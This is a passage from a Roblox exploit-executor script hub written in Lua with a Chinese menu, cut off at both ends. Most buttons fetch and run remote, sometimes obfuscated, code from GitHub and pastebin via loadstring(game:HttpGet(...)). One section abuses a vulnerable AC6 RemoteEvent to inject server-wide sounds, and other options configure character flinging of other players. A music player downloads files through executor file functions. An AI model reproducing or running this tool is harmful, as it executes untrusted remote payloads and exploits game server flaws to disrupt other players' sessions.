loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/SpamSounds", true))()
end)
about:Button("克洛布克斯核心武器", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/THEKORBLOXCORE_WEAPONRY", true))()
end)
about:Button("死亡", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/death", true))()
end)
about:Button("眼睛", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/eye", true))()
end)
about:Button("刀子", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/knife", true))()
end)
about:Button("月剑", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/moonsword", true))()
end)
about:Button("拳击", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/punch", true))()
end)
about:Button("死神", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/reaper", true))()
end)
about:Button("骷髅", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/sans", true))()
end)
about:Button("虚空之主", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/voidboss", true))()
end)

about:Button("羊角色", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/S13rm6X3'),true))();
end)
about:Button("猫角色", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/FE-Cat/main/FE-Cat"))()
end)
about:Button("AmongUs(按Q、C、F键)", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)
about:Button("C00lgui界面", function()
loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
end)
about:Button("1x1x1x1", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
end)
local run = function(func) func() end

run(function()
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local Workspace = game:GetService("Workspace")
    
    about:Button("直升机", function()
        local player = Players.LocalPlayer
        local character = player.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            spawn(function()
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://27432686"
                local bruh = humanoid:LoadAnimation(Anim)
                bruh:Play()
                bruh:AdjustSpeed(0)
                
                local animate = character:FindFirstChild("Animate")
                if animate then animate.Disabled = true end
                
                local hi = Instance.new("Sound")
                hi.Name = "Sound"
                hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
                hi.Volume = 2
                hi.Looped = true
                hi.archivable = false
                hi.Parent = Workspace
                hi:Play()
                
                local spinSpeed = 40
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local Spin = Instance.new("BodyAngularVelocity")
                    Spin.Name = "Spinning"
                    Spin.Parent = hrp
                    Spin.MaxTorque = Vector3.new(0, math.huge, 0)
                    Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
                end
            end)
        else
            spawn(function()
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://507776043"
                local bruh = humanoid:LoadAnimation(Anim)
                bruh:Play()
                bruh:AdjustSpeed(0)
                
                local animate = character:FindFirstChild("Animate")
                if animate then animate.Disabled = true end
                
                local hi = Instance.new("Sound")
                hi.Name = "Sound"
                hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
                hi.Volume = 2
                hi.Looped = true
                hi.archivable = false
                hi.Parent = Workspace
                hi:Play()
                
                local spinSpeed = 40
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local Spin = Instance.new("BodyAngularVelocity")
                    Spin.Name = "Spinning"
                    Spin.Parent = hrp
                    Spin.MaxTorque = Vector3.new(0, math.huge, 0)
                    Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
                end
            end)
        end
        
        local Mouse = Players.LocalPlayer:GetMouse()
        local urchar = character
        
        task.spawn(function()
            local qUp = Mouse.KeyUp:Connect(function(KEY)
                if KEY == 'q' then
                    if urchar and urchar.Humanoid then
                        urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight - 3
                    end
                end
            end)
            
            local eUp = Mouse.KeyUp:Connect(function(KEY)
                if KEY == 'e' then
                    if urchar and urchar.Humanoid then
                        urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight + 3
                    end
                end
            end)
        end)
    end)
end)

run(function()
    local Players = game:GetService("Players")
    
    about:Button("奇怪的舞蹈", function()
        local player = Players.LocalPlayer
        local originalRot
        local char = player.Character or player.CharacterAdded:Wait()
        local hrp = char:FindFirstChild("HumanoidRootPart")
        
        local function loadAnimation(char)
            local humanoid = char:WaitForChild("Humanoid")
            local animator = humanoid:FindFirstChildOfClass("Animator")
            if not animator then
                animator = Instance.new("Animator")
                animator.Parent = humanoid
            end
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://136720812089001"
            return animator:LoadAnimation(anim)
        end
        
        local function rotateCharacter(char, degrees)
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(degrees), 0)
            end
        end
        
        if hrp then
            originalRot = hrp.CFrame - hrp.Position
        end
        
        local currentTrack = loadAnimation(char)
        currentTrack.Looped = true
        currentTrack.Priority = Enum.AnimationPriority.Action
        currentTrack:Play(0, 99)
        currentTrack:AdjustSpeed(1)
        rotateCharacter(char, 180)
    end)
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        local Workspace = game:GetService("Workspace")
        local sound = Workspace:FindFirstChild("Sound")
        if sound then
            sound:Stop()
            sound:Destroy()
        end
    end)
end)
about:Button("AK-47",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-3/general/refs/heads/main/AK-47.lua"))()
end)

about:Button("FE抓取",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty1.lua"))()
end)
about:Button("John Doe R6",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-3/general/refs/heads/main/John%20Doe"))()
end)

about:Button("FE脚本",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sypcerr/FECollection/refs/heads/main/script.lua",true))()
end)

about:Button("百吨王",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6"))()
end)

about:Button("前后空翻动作", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E5%89%8D%E5%90%8E%E7%A9%BA%E7%BF%BB.txt"))()
end)

about:Button("巨人",function()
    _G.HideCharacter = true
_G.FlingEnabled = true
_G.TransparentRig = true
_G.ToolFling = false
_G.AntiFling = false
_G.CustomHats = true
_G.Scale = 4.2
_G.CH = {
    Torso = {
        Name= "Accessory (Torso)",
        TextureId = "83269599235494",
        Orientation= CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
    },
    RightArm = {
        Name= "Accessory (BIGGEST RIGHT ARMAccessory)",
        TextureId = "117484156735788", 
         Orientation= CFrame.Angles(math.rad(0),math.rad(90),math.rad(90))
    },
    LeftArm = {
        Name= "Accessory (BIGGEST LEFT ARMAccessory)",
        TextureId = "117484156735788", 
        Orientation= CFrame.Angles(math.rad(0),math.rad(90),math.rad(90))
    },
    RightLeg = {
        Name= "Accessory (RLeg)",
        TextureId = "83269599235494", 
        Orientation= CFrame.Angles(math.rad(0),math.rad(90),math.rad(90))
    },
    LeftLeg = {
        Name= "Accessory (LLeg)",
        TextureId = "83269599235494", 
        Orientation= CFrame.Angles(math.rad(0),math.rad(90),math.rad(90))
    },
    Head = {
        Name = "Accessory (big head)",
        Orientation = CFrame.new(),
    }
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/Oxide/refs/heads/main/LoadstringPerma"))()
task.wait(20)
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/OxideReanim/refs/heads/main/KrystalDance3"))()
end)

about:Button("地精",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rTvXTs8F16D8D2oiLxZ62E1E9jT1we312yUyJr2h72Vwqr32l37rirU1S89hqRV7.lua.txt"))()
end)

about:Button("c00lkidd",function()
    _G.Config = {
    ["HatCollide"]     = false,
    ["ReClaim"]        = true,
    ["Fling"]          = true,
    ["HideCharacter"]  = true,

    ["FlingOption"] = {
        ["HatFling"]        = false,
        ["Highlight"]       = true,
        ["PredictionFling"] = true,
        ["ToolFling"]       = false
    }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty2.lua"))()
end)

about:Button("滚球", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KaterHub-Inc/scripts/refs/heads/main/unofficial-Projects/FEHamsterBall.lua"))()
end)

local PIJIAOBEN = XIAOPI:Tab("音乐","136169594232359")

local about = PIJIAOBEN:section("客户端音乐", false)

local run = function(func) func() end

run(function()
    local soundLibrary = {
        ["防空警报"] = 792323017,
        ["义勇军进行曲"] = 1845918434,
        ["彩虹瀑布"] = 1837879082,
        ["雨中牛郎"] = 16831108393,
        ["钢管落地(大声)"] = 6729922069,
        ["钢管落地"] = 6011094380,
        ["闪灯"] = 8829969521,
        ["全损音质"] = 6445594239,
        ["串稀"] = 4809574295,
        ["手枪开枪"] = 6569844325,
        ["喝可乐"] = 6911756959,
        ["Doors TheHunt 倒计时开始"] = 16695384009,
        ["Doors TheHunt 倒计时结束"] = 16695021133,
        ["你他妈劈我瓜是吧"] = 7309604510,
        ["未知核爆倒计时"] = 9133927345,
        ["火车音"] = 3900067524,
        ["Gentry Road"] = 5567523008,
        ["植物大战僵尸"] = 158260415,
        ["早安越南"] = 8295016126,
        ["愤怒芒西 Evade?"] = 5029269312,
        ["梅西"] = 7354576319,
        ["永春拳"] = 1845973140,
        ["带劲的音乐"] = 18841891575,
        ["韩国国歌"] = 1837478300,
        ["哥哥你女朋友不会吃醋吧?"] = 8715811379,
        ["蜘蛛侠出场声音"] = 9108472930,
        ["消防车"] = 317455930,
        ["万圣节1🎃"] = 1837467198,
        ["好听的"] = 1844125168,
        ["妈妈生的"] = 6689498326,
        ["Music Ball-CTT"] = 9045415830,
        ["电音"] = 6911766512,
        ["梗合集"] = 8161248815,
        ["Its been so long"] = 6913550990,
        ["Baller"] = 13530439660,
        ["男娘必听"] = 6797864253,
        ["螃蟹之舞"] = 54100886218,
        ["布鲁克林惨案"] = 6783714255,
        ["航空模拟器音乐"] = 1838080629
    }
    
    _G.MusicData = {
        library = soundLibrary,
        getNames = function()
            local names = {}
            for name, _ in pairs(soundLibrary) do
                table.insert(names, name)
            end
            table.sort(names)
            return names
        end,
        getId = function(name)
            return soundLibrary[name]
        end
    }
end)

run(function()
    local Workspace = game:GetService("Workspace")
    local currentSound = nil
    local isPaused = true
    local playbackSpeed = 1
    local currentVolume = 0.5
    local selectedMusicName = ""
    
    local function playSound(soundId)
        if currentSound then
            currentSound:Stop()
            currentSound:Destroy()
        end
        
        currentSound = Instance.new("Sound")
        currentSound.SoundId = "rbxassetid://" .. soundId
        currentSound.Looped = true
        currentSound.PlaybackSpeed = playbackSpeed
        currentSound.Volume = currentVolume
        currentSound.Parent = Workspace
        
        if not isPaused then
            currentSound:Play()
        end
    end
    
    local function copyToClipboard(text)
        local success, result = pcall(function()
            if setclipboard then
                setclipboard(text)
                return true
            end
            return false
        end)
        
        if success and result then
            return true
        else
            print("音乐ID: " .. text)
            return false
        end
    end
    
    local musicNames = _G.MusicData.getNames()
    
    about:Dropdown("选择音乐", "", musicNames, function(selected)
        selectedMusicName = selected
        playSound(_G.MusicData.getId(selected))
    end)
    
    about:Button("复制选中音乐的ID", function()
        if selectedMusicName ~= "" and _G.MusicData.getId(selectedMusicName) then
            local musicId = tostring(_G.MusicData.getId(selectedMusicName))
            if copyToClipboard(musicId) then
                warn("已复制音乐ID: " .. musicId)
            else
                warn("复制失败，音乐ID已显示在控制台: " .. musicId)
            end
        else
            warn("请先选择一首音乐")
        end
    end)
    
    about:Textbox("音乐播放器[自定义播放的音乐ID]", "", "输入音乐ID", function(input)
        if tonumber(input) then
            playSound(tonumber(input))
            selectedMusicName = ""
        else
            warn("请输入有效的音乐ID")
        end
    end)
    
    about:Toggle("播放/暂停", "", false, function(state)
        isPaused = not state
        if currentSound then
            if state then
                currentSound:Play()
            else
                currentSound:Pause()
            end
        end
    end)
    
    about:Textbox("设置音量", "", "输入", function(input)
        local volume = tonumber(input)
        if volume and volume >= 0 then
            currentVolume = volume
            if currentSound then
                currentSound.Volume = currentVolume
            end
        else
            warn("请输入有效的音量数值(≥0)")
        end
    end)
    
    about:Textbox("设置倍速", "", "输入", function(input)
        local speed = tonumber(input)
        if speed and speed > 0 then
            playbackSpeed = speed
            if currentSound then
                currentSound.PlaybackSpeed = playbackSpeed
            end
        else
            warn("请输入有效的倍速")
        end
    end)
end)

local about = PIJIAOBEN:section("FE AC6服务器端音乐", false)

local run = function(func) func() end

run(function()
    local player = game.Players.LocalPlayer
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local workspace = game:GetService("Workspace")
    local TweenService = game:GetService("TweenService")
    
    local InjectTo = game:GetService("TestService") 
    
    local specialChars = "1234567890QWRYUIOPASDFGHJKLZXVBMN+×÷=/_<>,!@#$%^&*?`~\\|{}€£¥₩qwertyuiopasdfghjklzxcvbnm"
    local randomName = nil
    
    local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
    
    local function generateRandomName()
        local length = math.random(5, 10)
        local name = ""
        for i = 1, length do
            local index = math.random(1, #specialChars)
            name = name .. specialChars:sub(index, index)
        end
        return name
    end
    
    local function findRemoteEvent(name, parent)
        for _, child in ipairs(parent:GetDescendants()) do
            if child:IsA("RemoteEvent") and child.Name == name then
                return child
            end
        end
        return nil
    end
    
    local function getRemoteEvent() 
        return findRemoteEvent("AC6_FE_Sounds", replicatedStorage) or findRemoteEvent("AC6_FE_Sounds", workspace)
    end
    
    local remote = getRemoteEvent()
    
    _G.AC6State = {
        musicId = "",
        volume = 1,
        pitch = 1,
        loop = false,
        isPlaying = false,
        randomName = nil
    }
    
    if remote then
        about:Label("✅ AC6状态 | 已连接 可播放服务器端音乐")
        
        about:Textbox("输入音乐ID", "", "输入", function(musicId)
            _G.AC6State.musicId = musicId
        end)
        
        about:Textbox("设置音量", "", "输入", function(volume)
            _G.AC6State.volume = tonumber(volume) or 1
        end)
        
        about:Textbox("设置倍速", "", "输入", function(pitch)
            _G.AC6State.pitch = tonumber(pitch) or 1
        end)
        
        about:Toggle("循环播放", "", false, function(loopEnabled)
            _G.AC6State.loop = loopEnabled
            if loopEnabled then
                NotificationLibrary:SendNotification("Success", "循环播放 已开启", 3)
            else
                NotificationLibrary:SendNotification("Info", "循环播放 已关闭", 3)
            end
        end)
        
        about:Toggle("播放/停止", "", false, function(state)
            if state then
                if not _G.AC6State.randomName then
                    _G.AC6State.randomName = generateRandomName()
                end
                
                local musicId = _G.AC6State.musicId or ""
                local volume = _G.AC6State.volume or 1
                local pitch = _G.AC6State.pitch or 1
                local loopEnabled = _G.AC6State.loop ~= false
                
                if musicId == "" then
                    NotificationLibrary:SendNotification("Error", "请输入音乐ID", 3)
                    _G.AC6State.isPlaying = false
                    return
                end
                
                local assetId = "rbxassetid://" .. musicId
                
                local success, err = pcall(function()
                    local currentRemote = getRemoteEvent()
                    if currentRemote then
                        local args = {
                            [1] = "newSound",
                            [2] = _G.AC6State.randomName,
                            [3] = InjectTo,
                            [4] = assetId,
                            [5] = pitch,
                            [6] = volume,
                            [7] = loopEnabled
                        }
                        currentRemote:FireServer(unpack(args))
                        currentRemote:FireServer("playSound", _G.AC6State.randomName)
                        NotificationLibrary:SendNotification("Success", "音乐播放中: " .. musicId, 3)
                        _G.AC6State.isPlaying = true
                    else
                        error("erm... Erorr? tf did the RemoteEvent went?")
                    end
                end)
                
                if not success then
                    NotificationLibrary:SendNotification("Error", "失去与AC6的连接", 5)
                    _G.AC6State.isPlaying = false
                else
                    _G.AC6State.isPlaying = true
                end
            else
                if _G.AC6State.randomName and _G.AC6State.isPlaying then
                    local success, err = pcall(function()
                        local currentRemote = getRemoteEvent()
                        if currentRemote then
                            currentRemote:FireServer("stopSound", _G.AC6State.randomName)
                            NotificationLibrary:SendNotification("Info", "音乐已停止", 3)
                            _G.AC6State.isPlaying = false
                        end
                    end)
                    
                    if not success then
                        NotificationLibrary:SendNotification("Error", "停止播放失败", 3)
                    end
                else
                    NotificationLibrary:SendNotification("Info", "没有正在播放的音乐", 3)
                end
            end
        end)
    else
        about:Label("❌ AC6状态 | 此服务器没有AC6漏洞 无法播放服务器端音乐")
    end
end)

local about = PIJIAOBEN:section("网易云音乐", false)

local run = function(func) func() end

run(function()
    _G.MusicPlayerData = {
        favorites = {},
        songHistory = {},
        playCount = 0,
        searchHistoryCount = 0,
        loopMode = "none",
        volume = 50  
    }
    
    local function loadFavorites()
        local success, data = pcall(function()
            return readfile("music_favorites.json")
        end)
        if success and data then
            local success, decoded = pcall(function()
                return game:GetService("HttpService"):JSONDecode(data)
            end)
            if success then
                _G.MusicPlayerData.favorites = decoded
                for i, fav in ipairs(_G.MusicPlayerData.favorites) do
                    local filePath = fav.id .. ".mp3"
                    local fileExists = pcall(function()
                        return readfile(filePath)
                    end)
                    if not fileExists then
                        local success, songData = pcall(function()
                            return game:HttpGet("http://music.163.com/song/media/outer/url?id=" .. fav.id .. ".mp3")
                        end)
                        if success and songData then
                            writefile(filePath, songData)
                        end
                    end
                end
            end
        end
    end
    
    local function saveFavorites()
        local success, encoded = pcall(function()
            return game:GetService("HttpService"):JSONEncode(_G.MusicPlayerData.favorites)
        end)
        if success then
            writefile("music_favorites.json", encoded)
        end
    end
    
    local function downloadSong(songId, songName)
        local filePath = songId .. ".mp3"
        local fileExists = pcall(function()
            return readfile(filePath)
        end)
        
        if not fileExists then
            local songUrl = "http://music.163.com/song/media/outer/url?id=" .. songId .. ".mp3"
            local success, fileData = pcall(function()
                return game:HttpGet(songUrl)
            end)
            if success and fileData then
                writefile(filePath, fileData)
                return getcustomasset(filePath)
            else
                return nil
            end
        else
            return getcustomasset(filePath)
        end
    end
    
    _G.MusicPlayerData.saveFavorites = saveFavorites
    _G.MusicPlayerData.downloadSong = downloadSong
    loadFavorites()
end)

run(function()
    _G.ColorMap = {
        ["白色"] = Color3.fromRGB(255, 255, 255),
        ["红色"] = Color3.fromRGB(255, 0, 0),
        ["蓝色"] = Color3.fromRGB(0, 0, 255),
        ["绿色"] = Color3.fromRGB(0, 255, 0),
        ["黄色"] = Color3.fromRGB(255, 255, 0),
        ["青色"] = Color3.fromRGB(0, 255, 255),
        ["紫色"] = Color3.fromRGB(128, 0, 128),
        ["橙色"] = Color3.fromRGB(255, 165, 0),
        ["粉色"] = Color3.fromRGB(255, 192, 203),
        ["浅蓝"] = Color3.fromRGB(100, 150, 255)
    }
end)

run(function()
    local lyricsData = {}
    local lyricsFrame = nil
    local lyricsText1 = nil
    local lyricsText2 = nil
    local lyricsUpdateTask = nil
    local lyricsEnabled = false
    local lyricsSize = 24
    local lyricsGui = nil
    local lyricsLocked = false
    local lyricsColor1 = Color3.fromRGB(100, 150, 255)
    local lyricsColor2 = Color3.fromRGB(255, 255, 255)
    local currentSongId = nil
    
    local savedLyricsState = {
        position = nil,
        visible = false,
        enabled = false,
        locked = false,
        size = 24,
        color1 = Color3.fromRGB(100, 150, 255),
        color2 = Color3.fromRGB(255, 255, 255)
    }
    
    local isRebuilding = false
    
    _G.LyricsModule = {
        enabled = false,
        size = 24,
        locked = false,
        color1 = lyricsColor1,
        color2 = lyricsColor2,
        
        createDisplay = function(preserveState, forceRebuild)
            if isRebuilding and not forceRebuild then
                return
            end
            
            isRebuilding = true
            
            if lyricsFrame then
                savedLyricsState.position = lyricsFrame.Position
                savedLyricsState.visible = lyricsFrame.Visible
                savedLyricsState.enabled = _G.LyricsModule.enabled
                savedLyricsState.locked = _G.LyricsModule.locked
                savedLyricsState.size = _G.LyricsModule.size
                savedLyricsState.color1 = _G.LyricsModule.color1
                savedLyricsState.color2 = _G.LyricsModule.color2
            end
            
            if lyricsGui then
                lyricsGui:Destroy()
                lyricsGui = nil
                lyricsFrame = nil
                lyricsText1 = nil
                lyricsText2 = nil
            end
            
            task.wait()
            
            lyricsGui = Instance.new("ScreenGui")
            lyricsGui.Name = "LyricsDisplay"
            lyricsGui.ResetOnSpawn = false
            lyricsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            lyricsGui.Parent = game:GetService("CoreGui")
            
            lyricsFrame = Instance.new("Frame")
            lyricsFrame.Name = "LyricsFrame"
            lyricsFrame.Size = UDim2.new(0, 500, 0, 55)
            
            if savedLyricsState.position then
                lyricsFrame.Position = savedLyricsState.position
            else
                lyricsFrame.Position = UDim2.new(0.5, -250, 0.8, -27)
            end
            
            lyricsFrame.BackgroundTransparency = 1
            lyricsFrame.BorderSizePixel = 0
            lyricsFrame.Parent = lyricsGui
            lyricsFrame.Draggable = not (savedLyricsState.locked or _G.LyricsModule.locked)
            lyricsFrame.Active = true
            lyricsFrame.Selectable = true
            
            lyricsText1 = Instance.new("TextLabel")
            lyricsText1.Name = "LyricsText1"
            lyricsText1.Size = UDim2.new(1, 0, 0, 28)
            lyricsText1.Position = UDim2.new(0, 0, 0, 0)
            lyricsText1.BackgroundTransparency = 1
            lyricsText1.Text = "等待播放..."
            lyricsText1.TextColor3 = savedLyricsState.color1
            lyricsText1.TextSize = savedLyricsState.size
            lyricsText1.TextWrapped = true
            lyricsText1.Font = Enum.Font.SourceSansBold
            lyricsText1.Parent = lyricsFrame
            
            lyricsText2 = Instance.new("TextLabel")
            lyricsText2.Name = "LyricsText2"
            lyricsText2.Size = UDim2.new(1, 0, 0, 27)
            lyricsText2.Position = UDim2.new(0, 0, 0, 28)
            lyricsText2.BackgroundTransparency = 1
            lyricsText2.Text = ""
            lyricsText2.TextColor3 = savedLyricsState.color2
            lyricsText2.TextSize = savedLyricsState.size
            lyricsText2.TextWrapped = true
            lyricsText2.Font = Enum.Font.SourceSansBold
            lyricsText2.Parent = lyricsFrame
            
            lyricsFrame.Visible = savedLyricsState.visible or _G.LyricsModule.enabled
            
            _G.LyricsModule.enabled = savedLyricsState.enabled
            _G.LyricsModule.locked = savedLyricsState.locked
            _G.LyricsModule.size = savedLyricsState.size
            _G.LyricsModule.color1 = savedLyricsState.color1
            _G.LyricsModule.color2 = savedLyricsState.color2
            
            if _G.CurrentSound and _G.CurrentSound.Playing and currentSongId then
                _G.LyricsModule.fetchLyricsForCurrentSong()
                if _G.LyricsModule.enabled then
                    _G.LyricsModule.startUpdateTask()
                end
            end
            
            isRebuilding = false
        end,
        
        updateDisplay = function(visible)
            if lyricsFrame then
                lyricsFrame.Visible = visible
                savedLyricsState.visible = visible
            end
        end,
        
        updateDraggable = function()
            if lyricsFrame then
                lyricsFrame.Draggable = not _G.LyricsModule.locked
                savedLyricsState.locked = _G.LyricsModule.locked
            end
        end,
        
        setLyrics = function(newLyrics)
            lyricsData = newLyrics or {}
        end,
        
        fetchLyricsForCurrentSong = function()
            if not _G.LyricsModule.enabled or not currentSongId then return end
            
            local lyricUrl = "http://music.163.com/api/song/lyric?id=" .. currentSongId .. "&lv=1&kv=1&tv=-1"
            local success, response = pcall(function()
                return game:HttpGet(lyricUrl)
            end)
            
            if success and response then
                local success, data = pcall(function()
                    return game:GetService("HttpService"):JSONDecode(response)
                end)
                
                if success and data and data.lrc and data.lrc.lyric then
                    local lyricText = data.lrc.lyric
                    local lyrics = {}
                    
                    for line in string.gmatch(lyricText, "[^\r\n]+") do
                        local minutes, seconds, text = string.match(line, "%[(%d+):(%d+%.?%d*)%](.*)")
                        if minutes and seconds and text and text ~= "" then
                            local totalSeconds = tonumber(minutes) * 60 + tonumber(seconds)
                            table.insert(lyrics, {
                                time = totalSeconds,
                                text = text
                            })
                        end
                    end
                    
                    table.sort(lyrics, function(a, b) return a.time < b.time end)
                    _G.LyricsModule.setLyrics(lyrics)
                else
                    _G.LyricsModule.setLyrics({})
                end
            else
                _G.LyricsModule.setLyrics({})
            end
        end,
        
        setCurrentSongId = function(songId)
            currentSongId = songId
        end,
        
        updateDisplay = function(currentTime)
            if not _G.LyricsModule.enabled or not lyricsText1 or not lyricsText1.Parent then 
                return 
            end
            
            if not _G.CurrentSound or not _G.CurrentSound.Playing then
                lyricsText1.Text = "等待播放..."
                lyricsText2.Text = ""
                return
            end
            
            if #lyricsData == 0 then
                lyricsText1.Text = "暂无歌词"
                lyricsText2.Text = ""
                return
            end
            
            local currentIndex = 0
            local nextIndex = 0
            
            for i = #lyricsData, 1, -1 do
                if currentTime >= lyricsData[i].time then
                    currentIndex = i
                    break
                end
            end
            
            if currentIndex > 0 and currentIndex < #lyricsData then
                nextIndex = currentIndex + 1
            end
            
            lyricsText1.Text = currentIndex > 0 and lyricsData[currentIndex].text or "准备播放..."
            lyricsText2.Text = nextIndex > 0 and lyricsData[nextIndex].text or ""
            
            lyricsText1.TextColor3 = _G.LyricsModule.color1
            lyricsText2.TextColor3 = _G.LyricsModule.color2
            lyricsText1.TextSize = _G.LyricsModule.size
            lyricsText2.TextSize = _G.LyricsModule.size
        end,
        
        startUpdateTask = function()
            _G.LyricsModule.stopUpdateTask()
            lyricsUpdateTask = game:GetService("RunService").Heartbeat:Connect(function()
                if _G.CurrentSound then
                    _G.LyricsModule.updateDisplay(_G.CurrentSound.TimePosition)
                end
            end)
        end,
        
        stopUpdateTask = function()
            if lyricsUpdateTask then
                lyricsUpdateTask:Disconnect()
                lyricsUpdateTask = nil
            end
        end,
        
        resetPosition = function()
            if lyricsFrame then
                lyricsFrame.Position = UDim2.new(0.5, -250, 0.8, -35)
                savedLyricsState.position = lyricsFrame.Position
            end
        end,
        
        setVisible = function(visible)
            if lyricsFrame then
                lyricsFrame.Visible = visible
                savedLyricsState.visible = visible
            end
            _G.LyricsModule.enabled = visible
        end,
        
        saveState = function()
            if lyricsFrame then
                savedLyricsState.position = lyricsFrame.Position
                savedLyricsState.visible = lyricsFrame.Visible
                savedLyricsState.enabled = _G.LyricsModule.enabled
                savedLyricsState.locked = _G.LyricsModule.locked
                savedLyricsState.size = _G.LyricsModule.size
                savedLyricsState.color1 = _G.LyricsModule.color1
                savedLyricsState.color2 = _G.LyricsModule.color2
            end
        end,
        
        restoreState = function()
            if _G.LyricsModule.enabled then
                _G.LyricsModule.createDisplay(true)
                if _G.CurrentSound and _G.CurrentSound.Playing then
                    _G.LyricsModule.startUpdateTask()
                end
            end
        end,
        
        updateSize = function(newSize)
            if lyricsText1 and lyricsText2 then
                lyricsText1.TextSize = newSize
                lyricsText2.TextSize = newSize
            end
            savedLyricsState.size = newSize
        end,
        
        updateColors = function(color1, color2)
            if lyricsText1 and lyricsText2 then
                lyricsText1.TextColor3 = color1 or savedLyricsState.color1
                lyricsText2.TextColor3 = color2 or savedLyricsState.color2
            end
            if color1 then savedLyricsState.color1 = color1 end
            if color2 then savedLyricsState.color2 = color2 end
        end
    }
end)

run(function()
    local currentSound = nil
    local songList = {}
    local searchResultsCount = nil
    local countdownLabel = nil
    local countdownTask = nil
    local isPlaying = false
    local currentSongIndex = nil
    local currentSongNameLabel = nil
    local searchSongNameLabel = nil
    local progressLabel = nil
    local startTimeLabel = nil
    local endTimeLabel = nil
    local savedStartTime = nil
    local savedEndTime = nil
    local searchHistoryCountLabel = nil
    local remainingTime = 0
    local playCountLabel = nil
    local lastPosition = 0
    local favoritesDropdown = nil
    local currentFavoriteLabel = nil
    local playModeLabel = nil
    local searchResultsLabel = nil
    local currentSongId = nil
    local volumeLabel = nil
    
    local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
    
    _G.CurrentSound = currentSound
    
    local function urlEncode(str)
        return game:GetService("HttpService"):UrlEncode(str)
    end
    
    local function stopCountdown()
        if countdownTask then
            countdownTask:Disconnect()
            countdownTask = nil
        end
        _G.LyricsModule.stopUpdateTask()
        if countdownLabel then
            countdownLabel.Text = "倒计时: 无"
        end
        if progressLabel then
            progressLabel.Text = "播放进度: 00:00 / 00:00"
        end
        if startTimeLabel then
            startTimeLabel.Text = "开始时间: --"
        end
        if endTimeLabel then
            endTimeLabel.Text = "结束时间: --"
        end
    end
    
    local function setVolume(volumeValue)
        _G.MusicPlayerData.volume = volumeValue
        if currentSound then
            currentSound.Volume = volumeValue / 100
        end
        if volumeLabel then
            volumeLabel.Text = "当前音量: " .. volumeValue .. "%"
        end
    end
    
    local function updateFavoriteStatus()
        if not currentFavoriteLabel then
            currentFavoriteLabel = about:Label("收藏状态: 未收藏")
        else
